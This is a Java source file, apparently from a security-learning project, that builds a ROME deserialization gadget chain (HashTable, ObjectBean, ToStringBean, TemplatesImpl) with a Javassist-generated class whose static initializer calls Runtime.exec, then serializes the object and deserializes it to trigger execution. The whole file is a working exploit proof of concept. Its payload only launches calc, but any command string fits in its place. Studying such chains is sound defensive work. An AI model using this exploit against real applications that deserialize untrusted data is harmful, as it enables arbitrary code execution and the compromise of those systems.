package org.dili.rome;

import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class HashTableExp {

    public static void main(String[] args) throws Exception{
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        // 创建恶意类
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass ctClass = classPool.makeClass("cccc");
        ctClass.setSuperclass(classPool.get(AbstractTranslet));
        ctClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes = ctClass.toBytecode();

        // 创建TemplatesImpl对象
        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        setFiled(templateImpl, "_bytecodes", new byte[][]{bytes});
        setFiled(templateImpl, "_name", "test");
        setFiled(templateImpl, "_tfactory", null);

        // 创建ToStringBean对象
        ToStringBean toStringBean = new ToStringBean(Templates.class, templateImpl);
        // 创建ObjectBean对象
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        setFiled(objectBean,"_toStringBean", null);
        setFiled(objectBean, "_cloneableBean", null);

        // 创建HashTable
        Hashtable hashtable = new Hashtable();
        hashtable.put(objectBean, "test");

        // 序列化
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("JavaSec/out/HashTable.bin"));
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.close();

        // 反序列化
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("JavaSec/out/HashTable.bin"));
        objectInputStream.readObject();
        objectInputStream.close();
    }

    public static void setFiled(Object o, String fieldname, Object value) throws Exception {
        Field field = o.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(o, value);
    }
}
